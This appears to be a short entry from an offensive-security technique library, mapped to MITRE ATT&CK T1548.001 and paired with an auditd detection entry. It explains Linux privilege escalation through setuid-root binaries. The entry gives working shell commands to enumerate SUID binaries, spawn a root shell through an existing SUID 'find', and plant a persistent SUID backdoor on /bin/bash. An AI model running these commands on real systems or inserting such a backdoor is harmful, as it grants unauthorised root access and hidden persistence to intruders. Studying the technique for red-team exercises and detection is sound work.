---
id: suid-abuse-privesc
title: SUID binary abuse → root (setuid escape / planted SUID bit)
section: Linux privilege escalation
phase: Privilege Escalation
attack:
  tactic: TA0004
  techniques: [T1548.001]
platform: [linux]
source: MITRE ATT&CK T1548.001; GTFOBins SUID escapes
pair: suid-abuse-auditd
---

A setuid-root binary runs as root no matter who launches it, so a SUID binary with a
shell escape is a standing path to `euid=0`. Enumerate the SUID set, then abuse one the
way you would a sudo grant — many of the same tools (`find`, `bash -p`, `nmap`,
`vim`) drop a root shell when their real owner is root and the setuid bit is set. `-p`
matters on the shell: it stops bash from dropping the inherited privileges. If you have
already reached root, the mirror move is *planting* a SUID backdoor — `chmod u+s` a
shell so any user can re-enter as root later. Local privesc — no target slots.

```sh
find / -perm -4000 -type f 2>/dev/null       # enumerate setuid-root binaries
/usr/bin/find . -exec /bin/sh -p \; -quit    # GTFOBins: an existing SUID binary → root shell
chmod u+s /bin/bash                          # (post-root) plant a SUID backdoor
```
